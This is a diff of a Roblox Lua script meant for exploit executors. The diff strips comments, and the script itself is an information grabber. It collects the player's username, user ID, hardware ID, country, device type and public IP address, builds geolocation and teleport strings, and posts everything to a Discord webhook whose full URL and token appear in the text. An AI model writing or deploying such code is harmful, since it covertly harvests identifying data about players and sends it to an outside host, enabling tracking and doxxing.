@@ -1,11 +1,10 @@
--- Services
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
 local UserInputService = game:GetService("UserInputService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
--- Platform information
 local platform = UserInputService:GetPlatform()
 local platformNameMap = {
     [Enum.Platform.Windows] = "Windows PC",
@@ -17,7 +16,6 @@ local platformNameMap = {
 }
 local deviceType = platformNameMap[platform] or "Unknown Device"
 
--- Player information
 local username = Players.LocalPlayer.Name
 local userId = Players.LocalPlayer.UserId
 local hwid = RbxAnalyticsService:GetClientId()
@@ -26,19 +24,17 @@ local job = tostring(game.JobId)
 local teleportStatement = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", '" .. job .. "')"
 local currentTime = os.date("%Y-%m-%d %H:%M:%S")
 
--- Initialization
 local countryCode
 local ipAddress = "Unknown"
 local githubRepo = "Pumpuma/Test"
 local filePath = hwid .. ".lua"
 
--- Get country code
+
 local success, result = pcall(function()
     return LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer)
 end)
 countryCode = success and result or "Unknown"
 
--- Get IP address
 if syn then
     ipAddress = syn.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
 elseif http then
@@ -46,7 +42,6 @@ elseif http then
 end
 ipAddress = HttpService:JSONDecode(ipAddress).ip
 
--- Functions
 local function generateCreateFileURL()
     local content = [[
 local c = false
@@ -71,14 +66,11 @@ local function generateGeoLink(ip)
 end
 
 local function generateDeleteFileURL()
-    -- Assuming you have a service that handles file deletion
     return "https://example.com/deletefile?filename=" .. filePath
 end
 
--- Identify executor
 local exe = pcall(function() return identifyexecutor() end) and identifyexecutor() or "Unknown"
 
--- Construct the webhook data
 local url = "https://discord.com/api/webhooks/1266146071416147968/ySql_yTSkL1qZyTkYgwGCY_DArYNAHiIkJwicDrqApUg5crckvee0qoBVgvWCc31E3mO" -- Replace with your webhook URL
 local data = {
     ["content"] = " ",
@@ -142,9 +134,7 @@ while true do
     end)
 
     if success then
-        -- Exit the loop if the script executes successfully
         break
     else
-        -- Do nothing if the script fails to load
     end
 end
